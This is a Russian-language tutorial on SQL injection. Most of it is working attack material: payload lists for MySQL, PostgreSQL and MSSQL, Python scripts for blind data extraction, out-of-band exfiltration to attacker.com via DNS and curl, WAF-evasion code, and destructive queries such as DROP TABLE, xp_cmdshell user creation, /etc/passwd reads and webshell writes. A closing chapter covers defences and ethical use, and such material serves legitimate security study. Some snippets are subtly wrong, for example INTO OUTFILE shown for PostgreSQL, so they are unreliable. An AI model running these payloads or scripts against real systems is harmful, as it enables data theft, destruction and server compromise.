# SQL Injection Techniques - Полный Учебник

## 🎯 Введение в SQL Injection

SQL Injection (SQLi) - это уязвимость безопасности, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение делает к базе данных. Это одна из самых опасных и распространенных уязвимостей в веб-приложениях.

### Что такое SQL Injection?

SQL Injection происходит, когда приложение принимает пользовательский ввод и вставляет его в SQL запрос без proper sanitization. Это позволяет злоумышленнику:

- **Украдать данные** - получить доступ к конфиденциальной информации
- **Модифицировать данные** - изменить или удалить данные в базе
- **Обойти аутентификацию** - войти в систему без правильных учетных данных
- **Выполнить команды** - выполнить произвольные SQL команды на сервере

### Пример Уязвимого Кода

```php
// УЯЗВИМЫЙ КОД - НЕ ИСПОЛЬЗОВАТЬ!
$query = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";
$result = mysqli_query($conn, $query);
```

Если злоумышленник введет `' OR '1'='1`, то запрос станет:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

Это вернет всех пользователей из базы данных!

---

## 📚 Глава 1: Базовые Техники SQL Injection

### 1.1 Error-Based SQL Injection

**Принцип:** Вызывать ошибки базы данных, чтобы получить информацию о структуре базы и данных.

#### Как это работает

Error-based injection использует то, что базы данных возвращают информативные сообщения об ошибках, когда SQL запрос некорректен. Анализируя эти ошибки, можно получить:

- Информацию о типе базы данных
- Структуру таблиц
- Имена колонок
- Данные из таблиц

#### Примеры Payloads

**MySQL:**
```sql
' OR 1=1 -- 
' UNION SELECT 1,2,3 -- 
' AND 1=2 -- 
' AND SLEEP(5) -- 
```

**PostgreSQL:**
```sql
' OR 1=1 -- 
' UNION SELECT NULL,NULL,NULL -- 
' AND 1=2 -- 
' AND pg_sleep(5) -- 
```

**MSSQL:**
```sql
' OR 1=1 -- 
' UNION SELECT NULL,NULL,NULL -- 
' AND 1=2 -- 
' WAITFOR DELAY '00:00:05' -- 
```

#### Практический Пример

Допустим, есть уязвимый URL:
```
https://example.com/product.php?id=1
```

Пробуем error-based payload:
```
https://example.com/product.php?id=1'
```

Если получаем ошибку:
```
You have an error in your SQL syntax; check the manual that corresponds 
to your MySQL server version for the right syntax to use near ''' at line 1
```

Это подтверждает MySQL базу данных!

#### Расширенные Error-Based Techniques

**MySQL Error-Based Extraction:**
```sql
' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e)) -- 
```

Это вернет имя базы данных в ошибке.

**PostgreSQL Error-Based Extraction:**
```sql
' AND cast((SELECT version()) as int) -- 
```

**MSSQL Error-Based Extraction:**
```sql
' AND 1=convert(int, (SELECT TOP 1 name FROM sys.tables)) -- 
```

### 1.2 Boolean-Based SQL Injection

**Принцип:** Использовать логические условия (true/false) для извлечения информации по битам.

#### Как это работает

Boolean-based injection не вызывает ошибок, но меняет поведение приложения в зависимости от истинности условия. Анализируя ответы, можно извлекать информацию посимвольно.

#### Примеры Payloads

```sql
' AND 1=1 --    (TRUE - нормальный ответ)
' AND 1=2 --    (FALSE - другой ответ или ошибка)
' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 64 -- 
```

#### Практический Пример

```
https://example.com/product.php?id=1' AND 1=1 -- 
```
Нормальный ответ - приложение возвращает продукт.

```
https://example.com/product.php?id=1' AND 1=2 -- 
```
Другой ответ или отсутствие продукта - условие работает!

#### Извлечение Данных по Битам

Чтобы извлечь имя базы данных посимвольно:

```sql
' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 65 -- 
```

Если ответ "true", то первый символ - 'A' (ASCII 65).

Автоматизация этого процесса:
```python
import requests

url = "https://example.com/product.php?id=1'"
database_name = ""

for position in range(1, 20):  # Максимум 20 символов
    for ascii_value in range(32, 127):  # Печатные ASCII символы
        payload = f"' AND ASCII(SUBSTRING((SELECT database()), {position}, 1)) = {ascii_value} -- "
        test_url = url + payload
        
        response = requests.get(test_url)
        
        # Проверяем, вернулся ли "true" ответ
        if "product found" in response.text:
            database_name += chr(ascii_value)
            print(f"Found character: {chr(ascii_value)}")
            break
    
    if len(database_name) < position:
        break  # Конец строки

print(f"Database name: {database_name}")
```

### 1.3 Time-Based SQL Injection

**Принцип:** Использовать задержки ответа для определения истинности условий.

#### Как это работает

Time-based injection использует функции задержки (SLEEP, WAITFOR) чтобы определить, истинно условие или ложно. Если ответ задерживается - условие истинно.

#### Примеры Payloads

**MySQL:**
```sql
' AND SLEEP(5) -- 
' AND IF(1=1, SLEEP(5), 0) -- 
' AND BENCHMARK(5000000, MD5(1)) -- 
```

**PostgreSQL:**
```sql
' AND pg_sleep(5) -- 
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- 
```

**MSSQL:**
```sql
' AND WAITFOR DELAY '00:00:05' -- 
' AND IF(1=1) WAITFOR DELAY '00:00:05' -- 
```

#### Практический Пример

```
https://example.com/product.php?id=1' AND SLEEP(5) -- 
```

Если ответ занимает ~5 секунд - уязвимость существует!

#### Извлечение Данных через Time-Based

```python
import requests
import time

url = "https://example.com/product.php?id=1'"
database_name = ""

for position in range(1, 20):
    for ascii_value in range(32, 127):
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT database()), {position}, 1)) = {ascii_value}, SLEEP(5), 0) -- "
        test_url = url + payload
        
        start_time = time.time()
        response = requests.get(test_url)
        end_time = time.time()
        
        # Если ответ занял > 4 секунд, условие истинно
        if end_time - start_time > 4:
            database_name += chr(ascii_value)
            print(f"Found character: {chr(ascii_value)}")
            break
    
    if len(database_name) < position:
        break

print(f"Database name: {database_name}")
```

### 1.4 Union-Based SQL Injection

**Принцип:** Использовать оператор UNION для объединения результатов malicious запроса с легитимным.

#### Как это работает

UNION-based injection позволяет злоумышленнику объединить результаты malicious SELECT запроса с результатами легитимного запроса. Это требует:

- Знание количества колонок в оригинальном запросе
- Совпадение типов данных колонок

#### Примеры Payloads

```sql
' UNION SELECT 1,2,3 -- 
' UNION SELECT NULL,NULL,NULL -- 
' UNION SELECT 'a','b','c' -- 
' UNION SELECT database(), user(), version() -- 
```

#### Практический Пример

Сначала определяем количество колонок:

```
https://example.com/product.php?id=1' ORDER BY 1 -- 
https://example.com/product.php?id=1' ORDER BY 2 -- 
https://example.com/product.php?id=1' ORDER BY 3 -- 
...
https://example.com/product.php?id=1' ORDER BY 10 -- 
```

Когда получаем ошибку - это на одну колонку больше чем нужно.

Допустим, ошибка на ORDER BY 6, значит 5 колонок.

Теперь используем UNION:
```
https://example.com/product.php?id=1' UNION SELECT 1,2,3,4,5 -- 
```

Если видим числа в ответе - это колонки, которые можно заменить на полезные данные:

```
https://example.com/product.php?id=1' UNION SELECT database(), user(), version(),4,5 -- 
```

#### Извлечение Таблиц и Колонок

**MySQL:**
```sql
' UNION SELECT table_name, column_name, 3,4,5 FROM information_schema.columns WHERE table_schema=database() -- 
```

**PostgreSQL:**
```sql
' UNION SELECT table_name, column_name, 3,4,5 FROM information_schema.columns WHERE table_schema=current_schema() -- 
```

**MSSQL:**
```sql
' UNION SELECT table_name, column_name, 3,4,5 FROM information_schema.columns -- 
```

---

## 🚀 Глава 2: Продвинутые Техники SQL Injection

### 2.1 Stacked Queries SQL Injection

**Принцип:** Выполнение нескольких SQL запросов в одном statement.

#### Как это работает

Stacked queries позволяют выполнить несколько SQL команд, разделенных точкой с запятой. Это работает не во всех базах данных и требует specific условий.

#### Примеры Payloads

**MySQL (только с certain configurations):**
```sql
'; DROP TABLE users -- 
'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned') -- 
```

**PostgreSQL:**
```sql
'; DROP TABLE users -- 
'; CREATE TABLE hacked (data text) -- 
```

**MSSQL:**
```sql
'; DROP TABLE users -- 
'; EXEC xp_cmdshell('dir') -- 
```

#### Практическое Использование

```sql
'; UPDATE users SET password='hacked' WHERE id=1 -- 
'; DELETE FROM logs WHERE id>100 -- 
'; ALTER TABLE users ADD COLUMN hacked_flag INT DEFAULT 1 -- 
```

### 2.2 Second-Order SQL Injection

**Принцип:** Injection происходит не в момент ввода данных, а когда эти данные используются позже.

#### Как это работает

Second-order injection (также известный как stored injection) происходит, когда:

1. Злоумышленник вводит malicious данные
2. Данные сохраняются в базе данных
3. Позже приложение использует эти данные в другом запросе
4. Injection выполняется в этот момент

#### Пример Сценария

**Шаг 1:** Регистрация с malicious username:
```
Username: admin' --
Password: anything
```

**Шаг 2:** Данные сохраняются в базе:
```sql
INSERT INTO users (username, password) VALUES ('admin' -- ', 'hash')
```

**Шаг 3:** Позже при login:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'hash'
```

Комментарий закрывает проверку пароля!

#### Детекция и Эксплуатация

Для детекции second-order injection:

1. Вводим уникальный маркер (например, `test_' + timestamp`)
2. Ждем, когда приложение использует эти данные
3. Проверяем, выполняется ли injection

```python
import time
import requests

# Шаг 1: Вводим маркер
marker = f"test_{int(time.time())}"
payload = f"' OR 1=1 -- {marker}"

register_data = {
    'username': payload,
    'password': 'test123'
}
requests.post('https://example.com/register', data=register_data)

# Шаг 2: Ждем и проверяем
time.sleep(60)  # Ждем, когда данные будут использованы

# Шаг 3: Проверяем, появился ли маркер в неожиданном месте
response = requests.get('https://example.com/profile')
if marker in response.text:
    print("Second-order injection detected!")
```

### 2.3 Blind SQL Injection с Conditional Errors

**Принцип:** Использование условных ошибок для извлечения информации.

#### Как это работает

Вместо time-based delays, используем функции, которые вызывают ошибки при определенных условиях. Это быстрее и надежнее.

#### Примеры Payloads

**MySQL:**
```sql
' AND (SELECT 1 FROM information_schema.tables) = 1 -- 
' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users) AS x) = 1 -- 
' AND ROW(1,2) > (SELECT COUNT(*), CONCAT(version(), 0x3a, 0x3a, user()) FROM users) -- 
```

**PostgreSQL:**
```sql
' AND (SELECT 1 FROM information_schema.tables) = 1 -- 
' AND CAST((SELECT COUNT(*) FROM users) AS INT) = 1 -- 
```

**MSSQL:**
```sql
' AND (SELECT 1 FROM information_schema.tables) = 1 -- 
' AND 1 = (SELECT COUNT(*) FROM users) -- 
```

### 2.4 Out-of-Band SQL Injection

**Принцип:** Извлечение данных через внешние каналы (DNS, HTTP, email).

#### Как это работает

Out-of-band injection не использует HTTP канал для извлечения данных. Вместо этого заставляет базу данных отправить данные на внешний сервер, контролируемый злоумышленником.

#### DNS Exfiltration (MySQL)

```sql
' AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\test')) -- 
```

База данных попытается разрешить DNS имя `database.attacker.com`, и мы увидим запрос в наших DNS logs.

#### HTTP Exfiltration (PostgreSQL)

```sql
' AND COPY (SELECT database()) TO PROGRAM('curl http://attacker.com/?data=' || database()) -- 
```

#### Практическая Реализация

```python
# Настройка DNS сервера для перехвата запросов
# (используя tools like dnslib, scapy, или online services)

import dnslib
import socket

def dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 53))
    
    while True:
        data, addr = sock.recvfrom(1024)
        request = dnslib.DNSRecord.parse(data)
        
        # Логируем DNS запрос
        for question in request.questions:
            print(f"DNS Query: {question.qname}")
            # Извлекаем данные из subdomain
            # Например: 'database_name.attacker.com' -> 'database_name'
        
        # Отвечаем на запрос
        response = request.reply()
        response.add_answer(dnslib.RR(
            request.q.qname,
            dnslib.QTYPE.A,
            dnslib.CLASS.IN,
            60,
            dnslib.A("1.2.3.4")
        ))
        
        sock.sendto(response.pack(), addr)

dns_server()
```

---

## 🛡️ Глава 3: Техники Обхода WAF

### 3.1 Case Variation Obfuscation

**Принцип:** Изменение регистра SQL ключевых слов.

#### Примеры

```sql
' OR 1=1 -- 
' oR 1=1 -- 
' Or 1=1 -- 
' OR 1=1 -- 
' or 1=1 -- 
```

Многие WAF проверяют только lowercase или uppercase версии.

### 3.2 Encoding Obfuscation

**Принцип:** Кодирование спецсимволов.

#### URL Encoding

```sql
' OR 1=1 -- 
'%20OR%201=1%20--%20
' +OR +1=1 +-- +
```

#### Hex Encoding

```sql
' OR 1=1 -- 
' OR 0x313D31 -- 
```

#### Unicode Encoding

```sql
' OR 1=1 -- 
'\u0027 OR \u0031=\u0031 -- 
```

### 3.3 Comment Obfuscation

**Принцип:** Вставка комментариев между ключевыми словами.

#### Примеры

```sql
'/**/OR/**/1=1/**/-- 
'/*!OR*/1=1-- 
' OR/**/1=1/**/-- 
'/*!00000OR*/1=1--  (MySQL specific version)
```

### 3.4 Space Obfuscation

**Принцип:** Замена пробелов альтернативными символами.

#### Примеры

```sql
' OR 1=1 -- 
'+OR+1=1+--+
'/**/OR/**/1=1/**/--+
'%09OR%091=1%09--%09  (tab)
'%0BOR%0B1=1%0B--%0B  (vertical tab)
```

### 3.5 Newline Obfuscation

**Принцип:** Использование новых строк для разрыва паттернов.

#### Примеры

```sql
' OR 1=1 -- 
'%0AOR%0A1=1%0A--%0A  (newline)
'%0DOR%0D1=1%0D--%0D  (carriage return)
```

### 3.6 Function Obfuscation

**Принцип:** Использование альтернативных функций или синтаксиса.

#### MySQL Alternatives

```sql
-- Вместо SELECT
' UNION SELECT 1,2,3 -- 
' UNION /*!SELECT*/ 1,2,3 -- 
' UNION /*!00000SELECT*/ 1,2,3 -- 

-- Вместо database()
' UNION SELECT schema(), 2,3 -- 
' UNION SELECT @@datadir, 2,3 -- 
```

#### PostgreSQL Alternatives

```sql
-- Вместо SELECT
' UNION SELECT 1,2,3 -- 
' UNION all SELECT 1,2,3 -- 

-- Вместо database()
' UNION SELECT current_database(), 2,3 -- 
' UNION SELECT current_schema(), 2,3 -- 
```

### 3.7 HTTP Parameter Pollution

**Принцип:** Отправка нескольких параметров с одинаковым именем.

#### Примеры

```
https://example.com/product.php?id=1&id=' OR 1=1 -- 
```

Некоторые WAF проверяют только первый параметр, а backend использует последний.

### 3.8 HTTP Header Injection

**Принцип:** Внедрение через HTTP headers вместо URL параметров.

#### Примеры

```
X-Forwarded-For: ' OR 1=1 -- 
User-Agent: ' OR 1=1 -- 
Referer: ' OR 1=1 -- 
Cookie: session=' OR 1=1 -- 
```

### 3.9 Fragment-Based Obfuscation

**Принцип:** Использование URL fragment (#) для скрытия payloads.

#### Примеры

```
https://example.com/product.php?id=1#' OR 1=1 -- 
```

WAF часто игнорирует fragment, но некоторые backend приложения его обрабатывают.

### 3.10 Automatic WAF Detection and Bypass

```python
import requests
import re

class WAFBypass:
    def __init__(self, target_url):
        self.target_url = target_url
        self.waf_detected = False
        self.waf_type = None
    
    def detect_waf(self):
        """Автоматическая детекция типа WAF"""
        
        # Отправляем тестовый payload
        test_payloads = [
            "' OR 1=1 -- ",
            "<script>alert(1)</script>",
            "../../../etc/passwd"
        ]
        
        for payload in test_payloads:
            response = self._send_payload(payload)
            
            # Анализируем ответ на признаки WAF
            if self._analyze_waf_response(response):
                self.waf_detected = True
                self.waf_type = self._identify_waf(response)
                break
        
        return self.waf_detected, self.waf_type
    
    def _send_payload(self, payload):
        """Отправка payload"""
        response = requests.get(self.target_url + payload)
        return response
    
    def _analyze_waf_response(self, response):
        """Анализ ответа на признаки WAF"""
        
        waf_signatures = [
            r"ModSecurity",
            r"Cloudflare",
            r"AWS WAF",
            r"Incapsula",
            r"Sucuri",
            r"Wordfence",
            r"403 Forbidden",
            r"blocked"
        ]
        
        for signature in waf_signatures:
            if re.search(signature, response.text, re.IGNORECASE):
                return True
        
        return False
    
    def _identify_waf(self, response):
        """Идентификация типа WAF"""
        
        if "ModSecurity" in response.text:
            return "ModSecurity"
        elif "Cloudflare" in response.text:
            return "Cloudflare"
        elif "AWS" in response.text:
            return "AWS WAF"
        else:
            return "Unknown"
    
    def generate_bypass_payloads(self, original_payload):
        """Генерация bypass payloads"""
        
        bypass_techniques = [
            self._case_variation,
            self._url_encoding,
            self._comment_obfuscation,
            self._space_obfuscation,
            self._newline_obfuscation
        ]
        
        bypass_payloads = []
        
        for technique in bypass_techniques:
            bypass_payloads.extend(technique(original_payload))
        
        return bypass_payloads
    
    def _case_variation(self, payload):
        """Case variation"""
        variations = []
        
        # Все комбинации uppercase/lowercase для OR
        or_variants = ['OR', 'Or', 'oR', 'or']
        
        for variant in or_variants:
            variations.append(payload.replace('OR', variant))
        
        return variations
    
    def _url_encoding(self, payload):
        """URL encoding"""
        import urllib.parse
        
        variations = []
        
        # Полное URL encoding
        variations.append(urllib.parse.quote(payload))
        
        # Частичное encoding
        variations.append(payload.replace(' ', '%20'))
        variations.append(payload.replace("'", '%27'))
        
        return variations
    
    def _comment_obfuscation(self, payload):
        """Comment obfuscation"""
        variations = []
        
        # Добавление комментариев между словами
        variations.append(payload.replace(' ', '/**/'))
        variations.append(payload.replace(' ', '/*!*/'))
        
        return variations
    
    def _space_obfuscation(self, payload):
        """Space obfuscation"""
        variations = []
        
        # Замена пробелов на +
        variations.append(payload.replace(' ', '+'))
        
        # Замена на tab
        variations.append(payload.replace(' ', '%09'))
        
        return variations
    
    def _newline_obfuscation(self, payload):
        """Newline obfuscation"""
        variations = []
        
        # Добавление newlines
        variations.append(payload.replace(' ', '%0A'))
        
        return variations
```

---

## 🔥 Глава 4: Супер Техники и Edge Cases

### 4.1 SQL Injection в ORDER BY Clause

**Принцип:** Injection в ORDER BY clause для извлечения данных.

#### Примеры

```sql
SELECT * FROM products ORDER BY id ASC
```

Injection:
```sql
SELECT * FROM products ORDER BY (SELECT 1 FROM users WHERE username='admin')
```

Если admin существует, сортировка будет работать иначе.

#### Blind Extraction в ORDER BY

```sql
ORDER BY (CASE WHEN (SELECT SUBSTRING(database(), 1, 1) = 'a') THEN id ELSE 1 END)
```

Если первый символ базы данных 'a', сортировка будет по id, иначе по 1.

### 4.2 SQL Injection в LIMIT Clause

**Принцип:** Injection в LIMIT clause (некоторые базы данных поддерживают).

#### Примеры (MySQL)

```sql
SELECT * FROM products LIMIT 1
```

Injection:
```sql
SELECT * FROM products LIMIT 1, (SELECT 1 FROM users WHERE username='admin')
```

### 4.3 SQL Injection в GROUP BY Clause

**Принцип:** Injection в GROUP BY clause.

#### Примеры

```sql
SELECT * FROM products GROUP BY category
```

Injection:
```sql
SELECT * FROM products GROUP BY (CASE WHEN (SELECT database()) = 'testdb' THEN category ELSE 1 END)
```

### 4.4 SQL Injection с Time-Based Conditional Sleep

**Принцип:** Умная задержка только при определенных условиях для эффективности.

#### Примеры

**MySQL:**
```sql
' AND IF((SELECT database()) = 'testdb', SLEEP(5), 0) -- 
```

**PostgreSQL:**
```sql
' AND CASE WHEN (SELECT database()) = 'testdb' THEN pg_sleep(5) ELSE pg_sleep(0) END -- 
```

### 4.5 SQL Injection с XML/XPath Injection

**Принцип:** Использование XML/XPath функций для извлечения данных.

#### Примеры (MySQL)

```sql
' AND UPDATEXML('<a>', CONCAT('//', (SELECT database()), '<b>'), '<c>') -- 
```

Это вернет XML ошибку с именем базы данных.

### 4.6 SQL Injection с JSON Extraction

**Принцип:** Использование JSON функций для извлечения данных (современные базы данных).

#### Примеры (MySQL 5.7+)

```sql
' AND JSON_EXTRACT((SELECT CONCAT('{"db":"', database(), '"}')), '$.db') = 'testdb' -- 
```

#### Примеры (PostgreSQL)

```sql
' AND (SELECT json_build_object('db', current_database()))::text LIKE '%testdb%' -- 
```

### 4.7 SQL Injection с File System Operations

**Принцип:** Чтение/запись файлов через SQL injection.

#### Примеры (MySQL)

```sql
-- Чтение файла
' UNION SELECT LOAD_FILE('/etc/passwd'), 2, 3 -- 

-- Запись файла
' UNION SELECT 'malicious code', 2, 3 INTO OUTFILE '/var/www/html/shell.php' -- 
```

#### Примеры (PostgreSQL)

```sql
-- Чтение файла
' UNION SELECT pg_read_file('/etc/passwd'), 2, 3 -- 

-- Запись файла
' UNION SELECT 'malicious code', 2, 3 INTO OUTFILE '/var/www/html/shell.php' -- 
```

### 4.8 SQL Injection с Stored Procedures

**Принцип:** Использование stored procedures для выполнения команд.

#### Примеры (MSSQL)

```sql
' EXEC xp_cmdshell('dir') -- 
' EXEC master..xp_cmdshell 'net user hacker pwned /add' -- 
```

### 4.9 SQL Injection в Stored Procedures

**Принцип:** Injection в параметры stored procedures.

#### Примеры

```sql
EXEC GetUserData @username = 'admin' -- 
```

Injection:
```sql
EXEC GetUserData @username = 'admin' OR 1=1 -- 
```

### 4.10 SQL Injection с NoSQL Databases

**Принцип:** Injection в NoSQL queries (MongoDB, etc.).

#### Примеры (MongoDB)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

Это bypass аутентификации в MongoDB!

### 4.11 SQL Injection с ORM Frameworks

**Принцип:** Bypass ORM protections через raw SQL.

#### Примеры (Django)

```python
# УЯЗВИМО: Raw SQL без sanitization
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
```

Injection:
```
username = "admin' OR '1'='1"
```

### 4.12 Second-Order Injection в UPDATE Statements

**Принцип:** Injection в UPDATE, который выполняется позже.

#### Примеры

```sql
UPDATE users SET last_login = NOW() WHERE username = 'admin' -- 
```

Injection:
```sql
UPDATE users SET last_login = NOW() WHERE username = 'admin' OR '1'='1' -- 
```

### 4.13 SQL Injection в Database Triggers

**Принцип:** Injection через triggers, которые выполняются автоматически.

#### Примеры

```sql
CREATE TRIGGER audit_trigger
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    INSERT INTO audit_log VALUES (NEW.username, NOW());
END;
```

Injection:
```sql
INSERT INTO users (username) VALUES ('admin'); DROP TABLE audit_log -- 
```

### 4.14 SQL Injection в Database Views

**Принцип:** Injection через views, которые скрывают реальные таблицы.

#### Примеры

```sql
CREATE VIEW user_view AS SELECT * FROM users WHERE active = 1;
```

Injection:
```sql
SELECT * FROM user_view WHERE username = 'admin' OR '1'='1' -- 
```

### 4.15 SQL Injection с Conditional Comments

**Принцип:** Использование conditional comments для version-specific attacks.

#### Примеры (MySQL)

```sql
' /*!00000OR*/ 1=1 --  (Только для MySQL 5.0+)
' /*!32302OR*/ 1=1 --  (Только для MySQL 3.23.02+)
```

### 4.16 SQL Injection с Hex Encoding Payloads

**Принцип:** Полное hex encoding payloads для обхода фильтров.

#### Примеры

```sql
' OR 1=1 -- 
0x27204f5220313d31202d2d20  (Hex encoded)
```

Использование:
```sql
SELECT * FROM users WHERE username = 0x27204f5220313d31202d2d20
```

### 4.17 SQL Injection с Base64 Encoding

**Принцип:** Base64 encoding payloads.

#### Примеры

```sql
' OR 1=1 -- 
JyBPUiAxPTEgLS0g  (Base64 encoded)
```

Использование (если приложение декодирует Base64):
```sql
SELECT * FROM users WHERE username = FROM_BASE64('JyBPUiAxPTEgLS0g')
```

### 4.18 SQL Injection в Subqueries

**Принцип:** Сложные subqueries для извлечения данных.

#### Примеры

```sql
SELECT * FROM users WHERE id = (SELECT id FROM admin WHERE username = 'admin')
```

Injection:
```sql
SELECT * FROM users WHERE id = (SELECT id FROM admin WHERE username = 'admin' OR '1'='1')
```

### 4.19 SQL Injection с Recursive CTEs

**Принцип:** Использование Common Table Expressions для сложных атак.

#### Примеры (PostgreSQL)

```sql
WITH RECURSIVE cte AS (
    SELECT 1 AS n
    UNION ALL
    SELECT n + 1 FROM cte WHERE n < 10
)
SELECT * FROM users WHERE id IN (SELECT n FROM cte)
```

### 4.20 SQL Injection в Window Functions

**Принцип:** Использование window functions для извлечения данных.

#### Примеры (PostgreSQL, MySQL 8.0+)

```sql
SELECT * FROM (
    SELECT *, ROW_NUMBER() OVER (ORDER BY id) as rn FROM users
) t WHERE rn = (SELECT database())
```

---

## 🎓 Глава 5: Практические Лабораторные

### Лабораторная 1: Error-Based Injection

**Задача:** Найти и эксплуатировать error-based SQL injection.

**Шаги:**

1. **Детекция:**
```bash
# Тестируем на ошибки
curl "http://testphp.vulnweb.com/artists.php?artist=1'"
curl "http://testphp.vulnweb.com/artists.php?artist=1\""
curl "http://testphp.vulnweb.com/artists.php?artist=1)"
```

2. **Анализ ошибки:**
```
You have an error in your SQL syntax; check the manual that corresponds 
to your MySQL server version for the right syntax to use near ''' at line 1
```

3. **Извлечение информации:**
```bash
# Определяем количество колонок
curl "http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 1--"
curl "http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 2--"
# ... продолжаем пока не получим ошибку

# Используем UNION
curl "http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2--"

# Заменяем на полезные данные
curl "http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT database(),user()--"
```

### Лабораторная 2: Boolean-Based Injection

**Задача:** Извлечь имя базы данных через boolean-based injection.

**Python Script:**
```python
import requests
import string

url = "http://testphp.vulnweb.com/artists.php?artist="
database_name = ""

# Символы для перебора
chars = string.ascii_letters + string.digits + "_"

for position in range(1, 20):
    for char in chars:
        # Payload для проверки символа
        payload = f"1' AND ASCII(SUBSTRING((SELECT database()), {position}, 1)) = {ord(char)} -- "
        
        response = requests.get(url + payload)
        
        # Проверяем условие (адаптируйте под конкретное приложение)
        if "Artist" in response.text:  # Успешный ответ
            database_name += char
            print(f"Found: {char}")
            break
    
    if len(database_name) < position:
        break

print(f"Database name: {database_name}")
```

### Лабораторная 3: Time-Based Injection

**Задача:** Извлечь версию базы данных через time-based injection.

**Python Script:**
```python
import requests
import time
import string

url = "http://testphp.vulnweb.com/artists.php?artist="
version = ""

chars = string.digits + "."

for position in range(1, 20):
    for char in chars:
        payload = f"1' AND IF(ASCII(SUBSTRING((SELECT version()), {position}, 1)) = {ord(char)}, SLEEP(3), 0) -- "
        
        start_time = time.time()
        response = requests.get(url + payload)
        end_time = time.time()
        
        # Если ответ занял > 2.5 секунд, условие истинно
        if end_time - start_time > 2.5:
            version += char
            print(f"Found: {char}")
            break
    
    if len(version) < position:
        break

print(f"Database version: {version}")
```

### Лабораторная 4: WAF Bypass

**Задача:** Обойти WAF и выполнить injection.

**Python Script:**
```python
import requests
import urllib.parse

url = "http://testphp.vulnweb.com/artists.php?artist="

# Оригинальный payload
original_payload = "1' OR 1=1 -- "

# Bypass техники
bypass_payloads = [
    original_payload.replace(' ', '/**/'),  # Comment obfuscation
    original_payload.replace(' ', '%20'),    # URL encoding
    original_payload.replace(' ', '+'),      # Plus encoding
    original_payload.replace('OR', 'oR'),    # Case variation
    urllib.parse.quote(original_payload),    # Full encoding
]

for payload in bypass_payloads:
    test_url = url + payload
    response = requests.get(test_url)
    
    # Проверяем, обошли ли WAF
    if response.status_code == 200:
        print(f"Bypass successful: {payload}")
        break
    else:
        print(f"Bypass failed: {payload}")
```

### Лабораторная 5: Automated Tool Usage

**Задача:** Использовать SQLMap для автоматизации.

**Команды:**
```bash
# Базовое сканирование
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"

# С указанием параметра
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -p artist

# Извлечение базы данных
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs

# Извлечение таблиц
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D <database> --tables

# Извлечение колонок
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D <database> -T <table> --columns

# Извлечение данных
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D <database> -T <table> -C <column> --dump
```

---

## 🛡️ Глава 6: Защита от SQL Injection

### 6.1 Prepared Statements

**Принцип:** Использование parameterized queries.

#### Примеры

**Python (MySQL):**
```python
# УЯЗВИМО
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# ЗАЩИЩЕНО
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**PHP (PDO):**
```php
// УЯЗВИМО
$query = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";

// ЗАЩИЩЕНО
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $_GET['username']]);
```

### 6.2 Input Validation

**Принцип:** Валидация и sanitization пользовательского ввода.

#### Примеры

**Python:**
```python
import re

def validate_username(username):
    # Только буквенно-цифровые символы
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username")
    
    # Ограничение длины
    if len(username) > 50:
        raise ValueError("Username too long")
    
    return username
```

### 6.3 Least Privilege

**Принцип:** Минимальные права для database пользователя.

#### Примеры

```sql
-- Создание пользователя с ограниченными правами
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'webapp'@'localhost';
-- НЕ GRANT DROP, DELETE, ALTER, и т.д.
```

### 6.4 Web Application Firewall (WAF)

**Принцип:** Использование WAF для фильтрации malicious requests.

#### Примеры

**ModSecurity Rules:**
```apache
SecRule ARGS "@detectSQLi" \
    "id:1000,phase:2,deny,msg:'SQL Injection Attack',log,deny,status:403"
```

### 6.5 ORM Frameworks

**Принцип:** Использование ORM вместо raw SQL.

#### Примеры

**Django:**
```python
# ЗАЩИЩЕНО
user = User.objects.get(username=username)

# Вместо
# cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

---

## 📖 Заключение

### Ключевые Выводы

1. **SQL Injection остается одной из самых опасных уязвимостей**
2. **Существует множество техник exploitation**
3. **WAF можно обойти с правильными техниками**
4. **Защита требует многослойного подхода**
5. **Понимание техник необходимо для эффективной защиты**

### Дальнейшее Обучение

- Изучайте новые техники и методы защиты
- Практикуйтесь на легальных платформах (DVWA, WebGoat)
- Следите за security research и CVE
- Участвуйте в bug bounty программах
- Читайте security blogs и research papers

### Этическое Использование

Всегда помните:
- ✅ Тестируйте только системы, которые вам принадлежат
- ✅ Получайте письменное разрешение перед тестированием
- ✅ Сообщайте о найденных уязвимостях владельцам
- ✅ Используйте знания для защиты, а не атаки
- ❌ Не используйте техники для незаконных действий

### Ресурсы для Дальнейшего Изучения

- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **PortSwigger SQL Injection:** https://portswigger.net/web-security/sql-injection
